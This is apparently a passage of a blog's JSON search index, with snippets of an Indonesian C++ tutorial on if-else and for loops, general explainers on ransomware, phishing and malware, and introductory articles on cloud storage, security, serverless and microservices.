Inilah sebabnya mengapa pertama-tama kita memastikan bahwa input num tidak 0 dalam if condition luar. Catatan: Seperti yang Anda lihat, if...else Bersarang membuat logika Anda rumit. Jika memungkinkan, Anda harus selalu berusaha menghindari if else Bersarang.body if else Dengan Hanya Satu StatementJika body if else hanya memiliki satu Statement, Anda dapat menghilangkannya { } dalam program. Misalnya, Anda dapat menggantiint num = 5; if (num &amp;gt; 0) { cout &amp;lt;&amp;lt; &quot;Jumlahnya positive.&quot; &amp;lt;&amp;lt; endl; } else { cout &amp;lt;&amp;lt; &quot;Nomornya adalah negative.&quot; &amp;lt;&amp;lt; endl; }denganint num = 5; if (num &amp;gt; 0) cout &amp;lt;&amp;lt; &quot;Nomornya adalah positive.&quot; &amp;lt;&amp;lt; endl; else cout &amp;lt;&amp;lt; &quot;Nomornya adalah negative.&quot; &amp;lt;&amp;lt; endl;Output dari kedua program akan sama. Catatan: Meskipun tidak perlu digunakan { } jika isi if else hanya memiliki satu Statement, menggunakan { } membuat code Anda lebih mudah dibaca." }, { "title": "C++ for Loop", "url": "/cpp-for-loop/", "categories": "Programming CPP, CPP Flow Control, C++ for Loop", "tags": "Programming, C++, for, while, do while, initialization, condition, true_, false_, update, array, int, collection", "date": "2021-07-27 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar tentang C++ for loop dan cara kerjanya dengan beberapa contoh.Dalam pemrograman komputer, loop digunakan untuk mengulang block code.Sebagai contoh, katakanlah kita ingin menampilkan pesan sebanyak 100 kali. Kemudian alih-alih menulis statement print 100 kali, kita bisa menggunakan loop.Itu hanya contoh sederhana; kami dapat mencapai lebih banyak efisiensi dan kecanggihan dalam program kami dengan memanfaatkan loop secara efektif.Ada 3 jenis loop dalam C++. for loop while loop do while loopTutorial ini berfokus pada for loop C++ . Kita akan belajar tentang jenis loop lainnya dalam tutorial yang akan datang.C++ for loopSyntax for-loop adalah:for (inisialisasi; condition; update) { // body dari-loop }Di Sini, inisialisasi - menginisialisasi variable dan dieksekusi hanya sekali condition - jika true, body for loop dieksekusijika false, for loop dihentikan update - memperbarui nilai variable yang diinisialisasi dan kembali memeriksa conditionC++ Flowchart for LoopContoh 1: Print Angka Dari 1 hingga 5#include &amp;lt;iostream&amp;gt;using namespace std;int main() { for (int i = 1; i &amp;lt;= 5; ++i) { cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &quot; &quot;; } return 0;}Output1 2 3 4 5Berikut adalah cara kerja program ini looping Variable i &amp;lt;= 5 Tindakan 1 i = 1 true 1 diprint. i ditingkatkan menjadi 2 ke-2 i = 2 true 2 diprint. i ditingkatkan menjadi 3 ke-3 i = 3 true 3 diprint. i ditingkatkan menjadi 4 4th i = 4 true 4 diprint. i ditingkatkan menjadi 5 tanggal 5 i = 5 true 5 diprint. i ditingkatkan menjadi 6 tanggal 6 i = 6 false Loop dihentikan Contoh 2: Menampilkan teks 5 kali// Program C++ untuk menampilkan teks 5 kali#include &amp;lt;iostream&amp;gt;using namespace std;int main() { for (int i = 1; i &amp;lt;= 5; ++i) { cout &amp;lt;&amp;lt; &quot;Omaigot! &quot; &amp;lt;&amp;lt; endl; } return 0;}OutputOmaigot!Omaigot!Omaigot!Omaigot!Omaigot!Berikut adalah cara kerja program ini looping Variable i &amp;lt;= 5 Tindakan 1 i = 1 true Omaigot! diprint dan i ditingkatkan menjadi 2. ke-2 i = 2 true Omaigot! diprint dan i ditingkatkan menjadi 3. ke-3 i = 3 true Omaigot! diprint dan i ditingkatkan menjadi 4. 4th i = 4 true Omaigot! diprint dan i ditingkatkan menjadi 5. tanggal 5 i = 5 true Omaigot! diprint dan i ditingkatkan menjadi 6. tanggal 6 i = 6 false Loop dihentikan Contoh 3: Temukan jumlah n Angka Asli pertama// Program C++ untuk mencari jumlah n angka asli pertama// integer positive seperti 1,2,3 dan dikenal sebagai Angka asli#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int angka, jumlah; jumlah = 0; cout &amp;lt;&amp;lt; &quot;Masukkan sebuah integer positive: &quot;; cin &amp;gt;&amp;gt; angka; for (int i = 1; i &amp;lt;= angka; ++i) { jumlah += i; } cout &amp;lt;&amp;lt; &quot;Jumlah = &quot; &amp;lt;&amp;lt; jumlah &amp;lt;&amp;lt; endl; return 0;}OutputMasukkan sebuah integer positive: 10Jumlah = 55Dalam contoh di atas, kita memiliki dua variable angka dan jumlah. NSjumlah variable ditugaskan dengan 0 dan variable angka ditetapkan dengan nilai yang diberikan oleh user.Perhatikan bahwa kita telah menggunakan for loop.for(int i = 1; i &amp;lt;= angka; ++i)Di Sini, int i = 1: menginisialisasi variabel i i &amp;lt;= angka: menjalankan loop selama i kurang dari atau sama dengan angka ++i: meningkatkan variable i dengan 1 di setiap iterasiKapan i menjadi 11, condition adalah false dan jumlah sama dengan 0 + 1 + 2 + ... + 10.Ranged Based for LoopDi C++11, for loop berbasis rentang baru diperkenalkan untuk bekerja dengan collection seperti array dan vektor. Syntaxnya adalah:for (variable : collection) { // body dari loop}Di sini, untuk setiap nilai dalam collection, perulangan for dieksekusi dan nilainya ditetapkan ke variable.Contoh 4: range-based for Loop#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int angka_array[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10}; for (int n : angka_array) { cout &amp;lt;&amp;lt; n &amp;lt;&amp;lt; &quot; &quot;; } return 0;}Output1 2 3 4 5 6 7 8 9 10Dalam program di atas, kita telah mendeklarasikan dan menginisialisasi sebuah int array bernama angka_array. Ini memiliki 10 item.Di sini, kita telah menggunakan range-based for loop untuk mengakses semua item dalam array.C++ Infinite for loopJika condition dalam a for loop selalu true, itu berjalan selamanya (sampai memori penuh). Sebagai contoh,// infinite for loopfor(int i = 1; i &amp;gt; 0; i++) { // block dari code}Dalam program di atas, condition selalu true yang kemudian akan menjalankan code untuk waktu yang tidak di tentukan." }, { "title": "What is Ransomware?", "url": "/What-is-Ransomware/", "categories": "cybersecurity, Ransomware", "tags": "cybersecurity, malware, Network Security, Data Loss Prevention (DLP), Cloud Security, trusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS), Identity and Access Management (IAM) use, Antivirus/anti-malware, Ransomware, Phishing Attacks, Social engineering, Advanced Persistent Threat, network security, Firewalls, Forcepoint's Secure Enterprise SD-WAN, Administrative, Physical, Technical", "date": "2021-07-27 07:00:00 +0700", "snippet": "Ransomware DefinedRansomware is malicious software with one aim in mind: to extort money from its victims. It’s one of the most prolific criminal business models in existence today, mostly thanks to the multimillion-dollar ransoms criminals demand from individuals and corporations. These demands are very simple: pay the ransom, or have your operations severely compromised or shut down completely.Very often, the first an organization knows of an attack is when they receive an on-screen notification informing them that data on their network has been encrypted and will be inaccessible until the ransom has been paid. Only on payment will they be given the decryption key to access their data. Failure to pay could result in the key being destroyed, rendering the data inaccessible forever.How Ransomware WorksThe good news is that ransomware does not usually appear on its own. It must be activated in order to deliver its payload, usually through a malicious link or attachment in an email.There are generally five steps required for ransomware to achieve its objective: The System Is CompromisedThe majority of ransomware attacks start life as a social engineering exercise, usually in the form of an attachment or malicious link. The aim is to entice the user to click on these objects in order to activate the malware. The Malware Takes ControlOnce the malware has taken control of the system, certain file types will be encrypted and access will be denied to users. The Victim Is NotifiedFor the ransom to be paid, the user must be aware of the demands of the criminals. At this point, they will usually receive notification on the screen explaining the demands and how they can regain access. The Ransom Is PaidOnce they have system access, attackers will either identify and encrypt certain file types or deny access to the entire system. Full Access Is ReturnedIn the majority of cases, attackers return full control to the victim. It is in their interest to do this; failure to do so would mean few organizations would be willing to pay if they didn’t believe their data would be restored. Types of RansomwareRansomware may have only hit the headlines in recent years, but it is thought the first ransomware virus emerged as far back as 1998 when the PC Cyborg strain used symmetric encryption to prevent access to files. However, it wasn’t until 2012 that the Reveton worm appeared: the first strain of malware that would hold data hostage until a ransom payment was made.There are effectively two types of ransomware in the wild today: Crypto ransomware and Locker ransomware. Both prevent access to data and files, usually through the means of encryption." }, { "title": "What is Phishing?", "url": "/What-is-Phishing/", "categories": "cybersecurity, Ransomware", "tags": "cybersecurity, malware, Network Security, (DLP), Cloud Security, (IDS), (IPS), Identity and Access Management (IAM) use, Antivirus/anti-malware, Ransomware, Phishing Attacks, Social engineering, Advanced Persistent Threat, network security, Firewalls, Forcepoint's Secure Enterprise SD-WAN, Administrative, Physical, Technical, Email filters, Two Factor Authentication, Phishing", "date": "2021-07-27 07:00:00 +0700", "snippet": "Phishing DefinedPhishing is the fraudulent use of electronic communications to deceive and take advantage of users. Phishing attacks attempt to gain sensitive, confidential information such as usernames, passwords, credit card information, network credentials, and more. By posing as a legitimate individual or institution via phone or email, cyber attackers use social engineering to manipulate victims into performing specific actions—like clicking on a malicious link or attachment—or willfully divulging confidential information.Both individuals and organizations are at risk; almost any kind of personal or organizational data can be valuable, whether it be to commit fraud or access an organization’s network. In addition, some phishing scams can target organizational data in order to support espionage efforts or state-backed spying on opposition groups.Phishing MethodsPhishing attempts most often begin with an email attempting to obtain sensitive information through some user interaction, such as clicking on a malicious link or downloading an infected attachment. Through link manipulation, an email may present with links that spoof legitimate URLs; manipulated links may feature subtle misspellings or use of a subdomain. Phishing scams may use website forgery, which employs JavaScript commands to make a website URL look legitimate. Using covert redirection, attackers can corrupt legitimate websites with malicious pop-up dialogue boxes that redirect users to a phishing website. Infected attachments, such as .exe files, Microsoft Office files, and PDF documents can install ransomware or other malware.Phishing scams can also employ phone calls, text messages, and social media tools to trick victims into providing sensitive information.Types of Phishing AttacksSome specific types of phishing scams use more targeted methods to attack certain individuals or organizations.Spear FishingSpear phishing email messages won’t look as random as more general phishing attempts. Attackers will often gather information about their targets to fill emails with more authentic context. Some attackers even hijack business email communications and create highly customized messages.Clone PhishingAttackers are able to view legitimate, previously delivered email messages, make a nearly identical copy of it—or “clone”—and then change an attachment or link to something malicious.WhalingWhaling specifically targets high profile and/or senior executives in an organization. The content of a whaling attempt will often present as a legal communication or other high-level executive business.How to Prevent Phishing AttacksOrganizations should educate employees to prevent phishing attacks, particularly how to recognize suspicious emails, links, and attachments. Cyber attackers are always refining their techniques, so continued education is imperative.Some tell-tale signs of a phishing email include: ‘Too good to be true’ offers Unusual sender Poor spelling and grammar Threats of account shutdown, etc., particularly conveying a sense of urgency Links, especially when the destination URL is different than it appears in the email content Unexpected attachments, especially .exe filesAdditional technical security measures can include: Two Factor Authentication incorporating two methods of identity confirmation—something you know (i.e., password) and something you have (i.e., smartphone) Email filters that use machine learning and natural language processing to flag high-risk email messages. DMARC protocol can also prevent against email spoofing. Augmented password logins using personal images, identity cues, security skins, etc." }, { "title": "What is Malware?", "url": "/What-is-Malware/", "categories": "cybersecurity, Malware", "tags": "cybersecurity, malware, Network Security, Data Loss Prevention (DLP), Cloud Security, trusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS), Identity and Access Management (IAM) use, Antivirus/anti-malware, Ransomware, Phishing Attacks, Social engineering, Advanced Persistent Threat, network security, Firewalls, Forcepoint's Secure Enterprise SD-WAN, Administrative, Physical, Technical", "date": "2021-07-27 07:00:00 +0700", "snippet": "Malware DefinedMalware is the collective name for a number of malicious software variants, including viruses, ransomware and spyware. Shorthand for malicious software, malware typically consists of code developed by cyberattackers, designed to cause extensive damage to data and systems or to gain unauthorized access to a network. Malware is typically delivered in the form of a link or file over email and requires the user to click on the link or open the file to execute the malware.Malware has actually been a threat to individuals and organizations since the early 1970s when the Creeper virus first appeared. Since then, the world has been under attack from hundreds of thousands of different malware variants, all with the intent of causing the most disruption and damage as possible.What Can Malware Do?Malware delivers its payload in a number of different ways. From demanding a ransom to stealing sensitive personal data, cybercriminals are becoming more and more sophisticated in their methods. The following is a list of some of the more common malware types and definitions.3 Types of Malware:VirusPossibly the most common type of malware, viruses attach their malicious code to clean code and wait for an unsuspecting user or an automated process to execute them. Like a biological virus, they can spread quickly and widely, causing damage to the core functionality of systems, corrupting files and locking users out of their computers. They are usually contained within an executable file.WormsWorms get their name from the way they infect systems. Starting from one infected machine, they weave their way through the network, connecting to consecutive machines in order to continue the spread of infection. This type of malware can infect entire networks of devices very quickly.SpywareSpyware, as its name suggests, is designed to spy on what a user is doing. Hiding in the background on a computer, this type of malware will collect information without the user knowing, such as credit card details, passwords and other sensitive information.TrojansJust like Greek soldiers hid in a giant horse to deliver their attack, this type of malware hides within or disguises itself as legitimate software. Acting discretely, it will breach security by creating backdoors that give other malware variants easy access.RansomwareAlso known as scareware, ransomware comes with a heavy price. Able to lockdown networks and lock out users until a ransom is paid, ransomware has targeted some of the biggest organizations in the world today — with expensive results.How Does Malware Spread?Each type of malware has its own unique way of causing havoc, and most rely on user action of some kind. Some strains are delivered over email via a link or executable file. Others are delivered via instant messaging or social media. Even mobile phones are vulnerable to attack. It is essential that organizations are aware of all vulnerabilities so they can lay down an effective line of defense.How to Protect Against MalwareNow that you understand a little more about malware and the different flavors it comes in, let’s talk about protection. There are actually two areas to consider where protection is concerned: protective tools and user vigilance. The first is often the easiest to implement, simply because you can often set and forget best-in-class protective software that manages and updates itself. Users, on the other hand, can be prone to temptation (“check out this cool website!”) or easily led by other emotions such as fear (“install this antivirus software immediately”). Education is key to ensure users are aware of the risk of malware and what they can do to prevent an attack.With good user policies in place and the right anti-malware solutions constantly monitoring the network, email, web requests and other activities that could put your organization at risk, malware stands less of a chance of delivering its payload" }, { "title": "What is Cloud Storage and How Cloud Storage Works", "url": "/What-is-Cloud-Storage-and-How-Cloud-Storage-Works/", "categories": "Cloud, cloud, What is Cloud Storage and How Cloud Storage Works", "tags": "cloud storage, way cloud storage works, how cloud storage works, The way cloud storage works is", "date": "2021-07-27 07:00:00 +0700", "snippet": "How cloud storage works is very important to know. That’s because, its existence becomes very vital in the midst of a society that continues to develop. Actually, the existence of this novelty is related to the process of storing and sending files. Previously, sending and storing files seemed complicated.That’s because, it takes hardware as a medium. The hardware itself such as flash and hard disk. The existence of both can be said to be enough to facilitate some activities. However, without flash and hard disk, storage and sending of these files cannot be done.In today’s era, the function of both has greatly decreased. That’s because, storing and sending files can be done without the presence of hardware. You could say, the way cloud storage works is very easy for this activity. To understand it, let’s discuss in detail the meaning first.The following is the definition of cloud storageUnderstanding is the first thing that needs to be understood. Without understanding the meaning, it is difficult to know how it works thoroughly. If it needs to be explained, cloud storage itself is actually an online-based storage media. With that, an internet connection is needed when you want to access the files in it.Actually, the existence of this media is still very new. However, because of the convenience it provides, the number of fans is growing rapidly. Actually, to understand this convenience, it is necessary to know how cloud storage works in detail. But to make things easier, let’s make a comparison.Previously, the file storage process was done offline. Because it is done offline, hardware is needed to store it. Hardware durability certainly has a time limit. Therefore, the file will also be damaged if the device is also damaged. Different conditions will be seen when cloud storage is used.Files will not be saved on personal devices. However, the file will be stored on the server computer. The server computer itself will be managed by the provider. Of course, the provider already understands in detail how to perform hardware maintenance. With it, file security becomes more guaranteed.The advantages it has are extraordinaryThis security is not the only reason why this medium is in great demand. It has other advantages. One of the most important relates to the presence of viruses. Viruses are a big problem that people often face. When the virus attacks, the files will be corrupt and unusable.When using a flash, the possibility of getting a virus becomes greater. That’s because, flash will be used on many computers with different levels of security. Different conditions will clearly appear when using cloud storage. When stored there, virus problems can be avoided entirely.That’s because, the provider definitely provides a high level of security from these problems. Another advantage will also be seen in the ease of access. Storage using hardware has limited access. That’s because, only a few types of devices can be used.For example, let’s see when using a flash. If the flash is used, the file can only be opened on devices that have the ability to access the flash. If the device is not compatible, access is not possible. The way cloud storage works is much different.When in use, the type of device does not need to be considered. That’s because, access is done using the internet in full. As long as a device has an internet connection, the device can access the file. The clearest example of this condition is the Google site.Here’s How the Cloud Works in DetailTo understand it further, it would be better if you understand how it works in detail. If you look at it, the way cloud storage works itself is not as complicated as imagined. The essence of how this actually works is related to file copying. When saving files on cloud storage, you are like copying the server.But when it is copied on the server, the provider will give you full access. This access is entirely in your hands. The download process and changes to the file can be done as desired. In fact, the access of the file can also be expanded. This condition is usually done by business people.With extended access, parties outside the uploader can also access. With that, the optimization of the file can be done by several people. For the sake of security, this media definitely does not only use one server. There are several servers that are used as storage.The number of servers makes the possibility of bad things like file loss smaller. Most of the applications themselves do not require installation at an early stage. That’s because, most of the applications can be accessed using the internet. How cloud storage works This will obviously benefit users more.The absence of the installation process will make the space required becomes smaller. The most perfect form of application can probably be seen on google drive. This application allows someone to do full access to the uploaded files and even give access to others. If you already understand the benefits and meanings, be sure to use them in activities. By using it, you will certainly be very facilitated. The cost of buying storage media can also be minimized. Low costs and a very simple way of working cloud storage will definitely make it very easy." }, { "title": "What is Cloud Security?", "url": "/What-is-Cloud-Security/", "categories": "cybersecurity, Cloud Security", "tags": "cybersecurity, malware, Network Security, Data Loss Prevention (DLP), Cloud Security, trusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS), Identity and Access Management (IAM) use, Antivirus/anti-malware, Ransomware, Phishing Attacks, Social engineering, Advanced Persistent Threat, network security, Firewalls, Forcepoint's Secure Enterprise SD-WAN, Administrative, Physical, Technical, Cloud Security, Centralized, Reduced costs, Reduced Administration, Reliability", "date": "2021-07-27 07:00:00 +0700", "snippet": "Cloud security definedCloud security, also known as cloud computing security, consists of a set of policies, controls, procedures and technologies that work together to protect cloud-based systems, data, and infrastructure. These security measures are configured to protect cloud data, support regulatory compliance and protect customers’ privacy as well as setting authentication rules for individual users and devices. From authenticating access to filtering traffic, cloud security can be configured to the exact needs of the business. And because these rules can be configured and managed in one place, administration overheads are reduced and IT teams empowered to focus on other areas of the business.The way cloud security is delivered will depend on the individual cloud provider or the cloud security solutions in place. However, implementation of cloud security processes should be a joint responsibility between the business owner and solution provider.Why is cloud security important?For businesses making the transition to the cloud, robust cloud security is imperative. Security threats are constantly evolving and becoming more sophisticated, and cloud computing is no less at risk than an on-premise environment. For this reason, it is essential to work with a cloud provider that offers best-in-class security that has been customized for your infrastructure.Cloud security offers many benefits, including: Centralized security: Just as cloud computing centralizes applications and data, cloud security centralizes protection. Cloud-based business networks consist of numerous devices and endpoints that can be difficult to manage when dealing with shadow IT or BYOD. Managing these entities centrally enhances traffic analysis and web filtering, streamlines the monitoring of network events and results in fewer software and policy updates. Disaster recovery plans can also be implemented and actioned easily when they are managed in one place. Reduced costs: One of the benefits of utilizing cloud storage and security is that it eliminates the need to invest in dedicated hardware. Not only does this reduce capital expenditure, but it also reduces administrative overheads. Where once IT teams were firefighting security issues reactively, cloud security delivers proactive security features that offer protection 24/7 with little or no human intervention. Reduced Administration: When you choose a reputable cloud services provider or cloud security platform, you can kiss goodbye to manual security configurations and almost constant security updates. These tasks can have a massive drain on resources, but when you move them to the cloud, all security administration happens in one place and is fully managed on your behalf. Reliability: Cloud computing services offer the ultimate in dependability. With the right cloud security measures in place, users can safely access data and applications within the cloud no matter where they are or what device they are using. More and more organizations are realizing the many business benefits of moving their systems to the cloud. Cloud computing allows organizations to operate at scale, reduce technology costs and use agile systems that give them the competitive edge. However, it is essential that organizations have complete confidence in their cloud computing security and that all data, systems and applications are protected from data theft, leakage, corruption and deletion.All cloud models are susceptible to threats. IT departments are naturally cautious about moving mission-critical systems to the cloud and it is essential the right security provisions are in place, whether you are running a native cloud, hybrid or on-premise environment. Cloud security offers all the functionality of traditional IT security, and allows businesses to harness the many advantages of cloud computing while remaining secure and also ensure that data privacy and compliance requirements are met.Secure Data in the CloudCloud data security becomes increasingly important as we move our devices, data centers, business processes, and more to the cloud. Ensuring quality cloud data security is achieved through comprehensive security policies, an organizational culture of security, and cloud security solutions.Selecting the right cloud security solution for your business is imperative if you want to get the best from the cloud and ensure your organization is protected from unauthorized access, data breaches and other threats." }, { "title": "Types of Cloud Computing Services in the Business World", "url": "/Types-of-Cloud-Computing-Services-in-the-Business-World/", "categories": "Cloud, cloud, Types of Cloud Computing Services in the Business World", "tags": "Saas, Daas, IaaS, PaaS, Cloud Type Based on Service Type, Public Service, Private Service, Community Service, Hybrid Service, Cloud Type Based on Owned Network", "date": "2021-07-27 07:00:00 +0700", "snippet": "As a business person, you certainly want to develop your business to be bigger and more profitable. To achieve this goal, you certainly need a variety of devices to do so, one of which is quite important is cloud computing .Cloud computing is a medium used to provide services to users, especially for information technology systems so that activities and activities can be carried out easily. These activities can be in the form of business activities, organizations, or companies with special or general fields.By using this technology, all data and programs that you have will be automatically stored on the internet. You can access it easily, either with a gadget or laptop when you need virtual data for business and business purposes.If you are interested in using cloud computing services , here are details about the types of services available so far. All of them are services that are flexible, accessible, and can be accessed on a large scale.Cloud Type Based on Owned NetworkThe scope and nature of cloud services can be grouped based on the reach they have, divided into several parts, including public, private, community and hybrid services. The following is information related to the full service to make it easier for you to distinguish between them. Hybrid ServiceIs a type of service from various combinations of other clouds, both public, private, and community types. Although it can stand alone, it can still be combined with other inter-cloud applications if needed.It can be a combination of two cloud services, or all three at once. Those who use hybrid services usually want to take advantage of certain benefits that the service has, either its storage model or its more flexible access. Community ServiceIs a type of cloud computing service that can be accessed simultaneously by several organizations or companies, of course, it still has the same level of importance and equal security. By using community services, the stored data remains safe even if access is carried out simultaneously.Those who use community-specific cloud services usually have the same goal or vision. In addition to being accessed simultaneously, the management can also be done jointly, either by the company or organization or from a third party. Private ServiceIt is a special cloud service to be used for one particular organization or company, so it will not be accessible to other users. It cannot be accessed by just anyone, and is not as open as cloud services to the public.Companies that own private cloud services have considerable control over their use, access, or management. Not only that, the company or organization can also manage the software and hardware used, so that it is completely exclusive. Public ServiceThe last type of cloud computing service is the type of public service, which is a storage service that can be accessed in general. Customers, employees who work in the company, as well as officials and owners of the company can access the services available in their storage.If using public services, the resources are distributed evenly, both for data storage, the network that is accessed and its use, even though each person who accesses it is a different user. Public services are generally used by vendors or large companies, such as Google or Microsoft.In addition to dividing it into service types based on its reach, cloud computing types are also divided into the types of services provided. To make it easier to distinguish and choose which one is the best to use, here are brief details that will help you.Cloud Type Based on Service Type PaaS ModelIt is a cloud service that uses hardware as a medium to run its operating system. Hardware is used on a lease basis, along with the operating system, storage and internet network capacity. IaaS Model modelThe cloud computing service model used for the IaaS model is quite unique, where it has a complete service package. Starting from the hardware used as a virtual computer media, IP addresses, bandwidth and others. Daas ModelIt is a cloud data storage model that can be used remotely, so you can access it anytime without any restrictions. To use it, you only need to pay for storage according to the resources used. Saas ModelIt is the opposite of DaaS services, which rely more on software for the storage media used. You can make online purchases for the SaaS model and can be subscribed. Those are some choices of models and types of cloud computing services that you can use. You can choose which one suits your needs, budget, and type of use. Hopefully this information can help you, especially those who want data storage in the latest form of cloud systems." }, { "title": "Important Things in Serverless World in Cloud Computing", "url": "/Important-Things-in-Serverless-World-in-Cloud-Computing/", "categories": "Cloud, cloud, Types of Cloud Computing Services in the Business World", "tags": "Vendor, Service, Main Attention, Serverless, Cloud Computing, serverless in cloud computing", "date": "2021-07-27 07:00:00 +0700", "snippet": "Web-based applications have long been used in the world of computing . The use of applications will basically make it easier to complete human work. For its manufacture can not be separated from a computer and several things around it.When HTML began to appear hosting providers were still quite limited to a few government agencies and universities. Soon a programming language emerged that helped a web become more dynamic. There is also a web hosting that can help you install the source code and configure the database .After that, things related to virtual private servers or VPS kept popping up. Human interaction with servers is decreasing day by day. From this, a hosting provider emerged that provides services to accommodate source code and handle server problems, which are called serverless in cloud computing .Serverless concept began to be used by several major vendors as the latest technology concept. This is an ease to deal with the previous technology. In this case there are several terms or terms specifically used to help you better understand the meaning of these terms.Cloud ComputingCloud computing is a combination of the use of computers and Internet-based development. In language, it is often interpreted as cloud computing. The cloud in question is a metaphor for the internet like a cloud which is often depicted in a diagram for a computer network.This term is a period where computers become a technology that is highly utilized with the help of the internet and the like. At this time the concept of serverless is used to fulfill the real purpose. Serverless in Cloud computing is quite in line with each other.ServerlessThe serverless architecture doesn’t mean you don’t use a server at all. Because it is impossible that all client server concepts do not require a server. Unless you want to present client to client but this is still inefficient without a server at all.Serverless in cloud computing can develop web applications using minimal configuration. Less referred to in this term does not mean nothing at all. This means more referring to the reduction of the server in question. If you want to deploy serverless applicationsthen you don’t need to interact a lot via avenues such as SSH orotherremote connections .You have been facilitated by the web-based console provided by the service provider. For example, when you deploy a code that is connected to a proxy , you don’t have to fiddle with the configuration of the web server . For serverless in cloud computing , you can choose which code to execute.Main AttentionServerless architecture has main attention to several important points that support this concept. First there is availability which means the service is available within 24 hours without any downs except for errors when deploying code. Next is scalability, which means that scaling can be done when there is a spike in visitors and resource usage .Service integration is also a major concern in this concept where all existing services at this service provider can be used. There is also a minimal deployment on serverless in cloud computing which is a minimal configuration without entering the core settings.Cost reduction is also a major concern in reducing costs to manage infrastructure independently. Next there is manageable where this concept can be managed easily and quickly through an easy-to-use console for the convenience of all parties.Another major concern also focuses on monitoring without being limited to looking at resource usage via the CLI. Some of these important points are the main concern for serverless in cloud computing as the basic concept that becomes the identity of it. Some of these things become the integrity of this concept.ServiceIn this concept there are several special services offered to meet the intent of each user. The services consist of: Databases , (AWS RDS, Azure SQL Database , IBM Cloudant ) Function as a service, (AWS Lambda, Azure Function, Google Cloud Function, IBM Openwhisk) Notification , (AWS SNS, Azure Notification Hub) Storage , (AWS S3, AWS Glacier, Azure Blob Storage ) Data lake , (AWS Data Lake, Azure Data Lake ) Message queue , (AWS SQS, Azure Service Bus Queue ) Stream , (AWS Kinesis Stream, Azure Event Hub) Machine learning, (AWS Machine Learning, Azure Machine Learning)VendorThis concept can be presented directly by a special vendor. Vendors that provide serverless architecture services in cloud computing include: Microsoft Azure Amazon Web Services Google Cloud IBMThe conclusion is that the concept of serverless in cloud computing is a type of architecture that was in the period of using computers with several databases and special programming languages. This concept has a special service with several things that are the center of attention in this concept." }, { "title": "Get to know the term Microservice in the Cloud Computing World", "url": "/Get-to-know-the-term-Microservice-in-the-Cloud-Computing-World/", "categories": "Cloud, cloud, Get to know the term Microservice in the Cloud Computing World", "tags": "Perform load balancing, Perform caching on data and systems, Able to perform access control to all services and applications, Perform monitoring and API metering, Stand-alone Service, Easier to Set Up, Not Limited to Certain Technologies, Service can be Expanded, Changing Entity, Difficult to Implement Service Changes", "date": "2021-07-27 07:00:00 +0700", "snippet": "In the development of the IT world, microservices are a hot topic and are being discussed a lot. This is not without reason, because it provides great benefits to users, making services easier and more efficient.By using microservices, you can easily change the code in the service in the application, so that business and business services can be managed. It can also provide a good opportunity for the company to provide services more regularly and regularly.Those of you who are interested in using microservices in the world of cloud computing should know more complete information about them. That way, you can take full advantage of these microservice features, thus providing significant constructive changes.Complete Explanation of MicroserviceTo learn microservices, it’s a good idea to start from monolithic. In the microservice process, the services within an application are shared in such a way that it results in smaller and more detailed relationships. Later this pattern change will affect the relationship between the application and the database.In contrast to monolithic systems, services using microservices will divide the database schema into several parts. Later each service will be created with its own database, so that the programming language used will be in accordance with the needs of the database.Although divided into several parts, each service in the microservice will remain connected to each other. The technology used for these services can also be different, depending on the needs of the user.If you want to apply microservices in the world of cloud computing, especially if you want to put it on a certain platform, it cannot be used directly. You must first create an API gateway, so that each system can act as it functions. There are several tasks to be performed by the API gateway system, including:Perform load balancing .Perform caching on data and systems.Able to perform access control to all services and applications.Perform monitoring and API metering.Advantages of Using MicroserviceMicroservice is superior to other systems, especially monolithic. It is more secure and reliable , and has a fairly stable scale. The following are the advantages that you will get by using microservices, including: Stand-alone ServiceIn contrast to a monolithic system with one database, a microservice system provides services between servers and databases in one system. So that each service or service can stand alone without the help of other services. Easier to Set UpFor those of you who don’t have much free time to make repairs and system settings, then using microservices in the world of cloud computing can make your work easier. It is much easier to set up, because the maintenance process is quite easy and can be adjusted as needed. Not Limited to Certain TechnologiesWhen you use microservices, you can still use new technologies that will appear in the future. Even though it uses an API gateway, it can still be applied not only on the Android platform, but also on iOS and websites in various browsers. Service can be ExpandedWhen running a business, you certainly need a development team to maximize the work of each system and its parts. By using microservices, you can enable them to develop their own services, without interfering with other services. These advantages can certainly be a consideration for those of you who want to install microservices in the world of cloud computing . You don’t need to hesitate anymore to use it, especially if each part of the service requires different development.Disadvantages in Using MicroserviceAlthough it has advantages that are sufficient to help the service process in servers or applications, it does not mean that microservices do not have disadvantages. You have to know the shortcomings, so that you can cover these shortcomings with servers or other supporting platforms. The following are the disadvantages of microservices, including: Changing EntityWhen an entity in a database is changed, other entities must also be changed to make the process work uninterrupted. Therefore, during the use of microservices, you must run them carefully to avoid errors. Difficult to Implement Service ChangesIf you want to make a design change, the service may be difficult to change in some cases. This makes you need to carefully research the application that wants to use microservices, because it requires complex calculations and development. To use a microservice, you must know the runtime you want to use. Development and configuration of existing programs. That way, you can use it according to your needs and application development.That’s the information about microservices in the world of cloud computing that you need to know. Hopefully this information can help you, especially those who want to add these features in applications or service media owned in the field of computerization." }, { "title": "Comparison Between AWS, Alibaba Cloud, and Google Cloud Platform?", "url": "/Comparison-Between-AWS-Alibaba-Cloud-and-Google-Cloud-Platform/", "categories": "Cloud, cloud, Comparison Between AWS Alibaba Cloud and Google Cloud Platform", "tags": "AWS, Alibaba, Google", "date": "2021-07-27 07:00:00 +0700", "snippet": "Cloud computing services have recently received a lot of attention because it offers storage that is easier and more compact. Because it is digital, as long as internet network access is owned, all existing data remains safe.Currently there are many clouding services available on the internet, ranging from AWS, Alibaba Cloud, to cloud services owned by Google. If you want to use cloud storage services in the near future, it is important to know the advantages and disadvantages of each platform.The comparison of AWS, Alibaba Clou, and Google Cloud can be explained in more detail in the following information. So you can choose which one if it is in accordance with the needs and requirements in your business, activity, or work.AWSFor the AWS platform, they provide a free service for one year that can be accessed by users. So to see if AWS does provide the right service as needed, the free usage period can be utilized by interested customers.Although it provides a free service, AWS does not unlock all the features available in it. This means that there are some platforms that can indeed be used only for those who make purchases or use service subscriptions. Since it’s a free service, it’s certainly not a big problem for users who just want to try it out.Then related to additional services, what makes AWS look better compared to other platforms is that AWS more often opens official seminars or web seminars that AWS users can attend, so that users can take full advantage of the various features available in 